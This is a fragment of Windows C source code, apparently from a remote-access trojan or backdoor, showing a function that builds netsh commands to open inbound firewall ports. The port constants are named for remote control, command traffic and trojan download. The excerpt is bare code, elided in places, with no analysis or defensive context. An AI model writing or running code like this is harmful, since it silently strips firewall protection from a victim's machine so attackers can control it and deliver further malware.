...
DWORD __stdcall OpenFireWallPort()
{
	...
	wsprintfA(szCmd, "netsh advfirewall firewall add rule name=\"%d\" protocol=TCP dir=in localport=%u action=allow",
		NETWORK_DATAPORT, NETWORK_DATAPORT);
...
// 	}
	...
	wsprintfA(szCmd, "netsh advfirewall firewall add rule name=\"%d\" protocol=TCP dir=in localport=%u action=allow",
		NETWORK_CMDPORT, NETWORK_CMDPORT);
	...
	wsprintfA(szCmd, "netsh advfirewall firewall add rule name=\"%d\" protocol=TCP dir=in localport=%u action=allow",
		REMOTE_CONTROLPORT, REMOTE_CONTROLPORT);
	...
	wsprintfA(szCmd, "netsh advfirewall firewall add rule name=\"%d\" protocol=TCP dir=in localport=%u action=allow",
		DOWNLOADTROJAN_PORT, DOWNLOADTROJAN_PORT);
	...
	wsprintfA(szCmd, "netsh advfirewall firewall add rule name=\"%d\" protocol=TCP dir=in localport=%u action=allow",
		DOWNLOADPROGRAM_PORT, DOWNLOADPROGRAM_PORT);
